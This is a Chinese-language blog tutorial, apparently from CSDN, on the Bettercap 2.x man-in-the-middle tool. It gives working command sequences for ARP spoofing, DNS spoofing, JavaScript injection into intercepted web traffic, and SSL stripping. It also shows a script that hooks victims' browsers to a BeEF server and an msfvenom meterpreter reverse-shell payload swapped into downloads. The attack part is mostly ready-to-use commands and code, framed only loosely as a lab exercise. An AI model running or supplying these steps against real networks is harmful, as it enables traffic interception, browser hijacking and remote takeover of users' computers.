**目录**

[Bettercap](#t0 "Bettercap")

[安装](#t1 "安装")

[ARP欺骗](#t2 "ARP欺骗")

[DNS 欺骗](#t3 "DNS 欺骗")

[注入脚本](#t4 "注入脚本")

[结合Beef-XSS](#t5 "结合Beef-XSS")

[替换下载文件](#t6 "替换下载文件")

* * *

Bettercap
---------

很多人应该都听过或者用过Ettercap，这是[Kali](https://so.csdn.net/so/search?q=Kali&spm=1001.2101.3001.7020)下一款优秀的ARP欺骗的工具，可是由于它自从2015年开始就没有更新了。所以，即使软件再好，不更新的话，也还是不会得到使用者的青睐。我们今天要讲的就是ettercap的继承者Bettercap。

Ettercap有两个大的版本，一个是1.X的版本，另一个是2.X的版本。两个版本之间命令完全不一样，架构也重新变了。2.X版本的采用go语言编写的，很多人说2.X版本的比1.X版本的难使用多了。1.X版本的简单易使用，2.X版本的确实有点不易使用。所以，今天我们就简单讲讲Bettercap2.X版本的使用

> 版本：Bettercap2.1

### 安装

```
apt-get  install  bettercap        
bettercap   #开启bettercap，默认是开启的eth0网卡，如果想开启其他网卡，比如无线网卡wlan0，可以bettercap iface wlan0
```


安装完之后我们就可以打开了，打开之后会列出局域网中存活的主机。最前面的192.168.10.25的是我们自己的主机，网段是192.168.10.0/24

![](https://img-blog.csdnimg.cn/20181128121932982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们输入：help  查看bettercap的用法 

![](https://img-blog.csdnimg.cn/20181201091109317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**下面的一些功能的解释**

*   help  模块名称    ：显示指定模块的帮助
*   active：    显示当前运行中的模块的信息
*   quit ：  结束会话并退出
*   sleep 秒数：    休眠指定的秒数（和shell中的sleep一样）
*   get 变量：    获取变量的值
*   set 变量  值 ：   设置变量的值（有些模块有自定义变量，比如可用net.sniff.output变量指定嗅探器的输出的保存路径）
*   read 变量 提示：    显示提示来让用户输入，输入内容会被储存在变量中
*   clear：    清屏
*   include CAPLET：    在当前会话读取并运行这个caplet
*   ! 命令 ：  运行相应的shell命令并显示输出
*   alias MAC地址 别名： 给MAC地址设置一个别名

**一些常用模块**

*   api.rest：RESTful API模块
*   net.recon ：主机发现模块，用于发现局域网内存活的主机，默认是开启的
*   arp.spoof：arp欺骗模块
*   ble.recon：低功耗蓝牙设备发现模块
*   net.sniff : 网络嗅探模块
*   dhcp6.spoof：dhcp6欺骗模块(通过伪造DHCP数据包篡改客户端的DNS服务器，因此需要与dns.spoof一并启用)
*   dns.spoof：DNS欺骗模块
*   events.stream：串流输出模块（就是不断地在终端界面刷出程序的输出，例如arp截获的信息）
*   wifi：wifi模块，有deauth攻击（wifi杀手）和创建软ap的功能

我们可以使用 net.recon 模块的 net.show  列出局域网内存活的主机的信息

![](https://img-blog.csdnimg.cn/20181128124521543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### ARP欺骗

我们现在用 bettercap 来进行[ARP](https://so.csdn.net/so/search?q=ARP&spm=1001.2101.3001.7020)欺骗，先看看arp.spoof这个模块怎么用。输入：help  arp.spoof

![](https://img-blog.csdnimg.cn/20181128123203700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

*   arp.spoof  on : 开启ARP欺骗
*   arp.ban  on ： 开启ARP欺骗，用ban模式，这就意味着目标将不能上网，也就是断网攻击
*   arp.spoof off ：停止ARP欺骗 
*   arp.ban off :  停止ARP欺骗

**参数：**

*   arp.spoof.internal：如果为true，那么网络中的计算机之间的本地连接将被欺骗，否则只能连接到来自外部网络(默认为false)
*   arp.spoof.targets：要欺骗的目标，可以是 ip 、mac 或者 别名 ，也可以支持nmap形式的ip区域
*   arp.spoof.whitelist：白名单，就是不欺骗的目标，可以是ip、mac或者别名

对于参数，我们可以get和set。

```
set arp.spoof.targets  192.168.10.2,192.168.10.14   #我们设置攻击目标，用逗号分隔。分别欺骗网关(192.168.10.2)和要欺骗的主机(192.168.10.14是我另外一台主机)，这里也可以是一个网段，如：192.168.10-20      
get arp.spoof.targets    #获取arp.spoof.targets的值
```


![](https://img-blog.csdnimg.cn/20181128124805288.png)

设置好了参数之后，我们就可以开启ARP欺骗了：arp.spoof  on 

![](https://img-blog.csdnimg.cn/20181201091205264.png)

### DNS 欺骗

dns欺骗这里有一个前提，那就是局域网内的主机的DNS服务器是局域网内的网关，那样我们才能进行DNS欺骗，如果DNS服务器设置的是公网的DNS服务器，比如设置的谷歌的8.8.8.8 DNS服务器的话，这样是不能进行DNS欺骗的。

DNS欺骗之前，我们先得进行**ARP欺骗**，就是先欺骗主机让其认为网关就是我(攻击机)。然后由于主机的DNS服务器就是网关，所以主机会向我们发送DNS请求，这样我们就可以进行欺骗了。

```
set arp.spoof.targets 192.168.10.2,192.168.10.14      
arp.spoof on    #先开启arp欺骗      
set dns.spoof.domains www.baidu.com,www,taobao.com  #设置要欺骗的域名,多个域名用,分开，如果要欺骗所有的域名的话，为 *       
set dns.spoof.address 3.3.3.3   #设置将要欺骗的域名转换成对应的ip地址      
dns.spoof on   #开启dns欺骗，www.baidu.com和www.taobao.com对应的ip是3.3.3.3
```


![](https://img-blog.csdnimg.cn/2018112813250999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，已经欺骗成功了

![](https://img-blog.csdnimg.cn/20181128132810987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**还有一种方法**

我们可以在打开bettercap的目录创建一个文件host，文件中存放这要欺骗的域名和地址，如下

```
1.1.1.1 www.baidu.com      
2.2.2.2 www.taobao.com      
3.3.3.3 www.mi.com
```


然后我们进行DNS欺骗的时候只需要设置arp.spoof.hosts这个参数即可

```
#之前我们得先进行arp欺骗      
set dns.spoof.hosts host  #设置dns.spoof.hosts里面存放这要欺骗的域名和欺骗后的地址，在bettercap打开的目录下      
dns.spoof on  #开启dns欺骗
```


![](https://img-blog.csdnimg.cn/20181128133652855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

很明显，已经欺骗成功了！ 

 ![](https://img-blog.csdnimg.cn/20181128133903380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 注入脚本

通过进行ARP欺骗，我们可以拦截到流量，自然，我们就可以对拦截到的流量进行操作。我们可以对包内的http协议的数据包进行代理，然后往里面注入恶意脚本

```
set arp.spoof.targets 192.168.10.13,192.168.10.2    #设置arp欺骗的目标      
set http.proxy.script /root/1.js       #往http流量中注入脚本       
set https.proxy.script /root/1.js       
http.proxy on   #开启HTTP代理      
https.proxy on       
arp.spoof on   #开启ARP欺骗       
##/root/1.js      1
function onResponse(req,res){      1
    if(res.ContentType.indexOf('text/html')==0){      1
        var body=res.ReadBody();      1
        if(body.indexOf('</head>')!=-1){      1
            res.Body=body.replace(      1
                '</head>',      1
               '<script type="text/javascript">alert("your computer has hacked!")</script></head>'      1
            );      1
            }      1
        }      2
}
```


![](https://img-blog.csdnimg.cn/20181130193936197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们用靶机访问一个http和https协议的站点，可以看到，脚本已经注入请求的网页中了。

![](https://img-blog.csdnimg.cn/20190509222910173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190509224123787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 结合Beef-XSS

既然我们可以注入js脚本文件，那么我们就可以利用beef来对目标浏览器进行控制

```
set arp.spoof.targets 192.168.10.13,192.168.10.2    #设置arp欺骗的目标      
set http.proxy.script  /root/test.js        #往http流量中注入脚本/root/test.js      
set http.proxy.sslstrip true    #启用SSL剥离       
http.proxy on   #开启HTTP代理      
arp.spoof on   #开启ARP欺骗       1
#test.js内容      1
function onResponse(req,res){      1
    if(res.ContentType.indexOf('text/html')==0){      1
        var body=res.ReadBody();      1
        if(body.indexOf('</head>')!=-1){      1
            res.Body=body.replace(      1
                '</head>',      1
               '<script type="text/javascript" src="http://192.168.10.27:3000/hook.js"></script></head>'      1
            );      1
            }      2
        }      2
}
```


![](https://img-blog.csdnimg.cn/20181130203906954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，我们的js代码已经插入网页中了 

![](https://img-blog.csdnimg.cn/20181130203942436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

那我们就可以利用beef对目标浏览器进行很多操作了！

### 替换下载文件

在bettercap中，有一种文件后缀叫.cap，我们启动bettercap的时候可以指定该.cap文件，就会按照该.cap文件执行命令。

我们进入bettercap后，可以使用命令 **caplets.update** 更新.cap文件，然后使用命令 **caplets.show** 查看.cap文件有哪些。

![](https://img-blog.csdnimg.cn/20190509230237424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们这次替换下载文件，使用的是 download-autopwn.cap 文件。我们先到该文件的目录下，因为我们要欺骗的是windows系统的主机，所以我们先到该目录的windows目录下，生成一个payload.exe文件，然后退回到上一个目录，执行启动命令

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.11 lport=8888 -f exe -o payload.exe        
bettercap -caplet download-autopwn.cap
```


![](https://img-blog.csdnimg.cn/20190509231030207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章：[Beef-XSS和MSF的利用](https://blog.csdn.net/qq_36119192/article/details/82731839 "Beef-XSS和MSF的利用")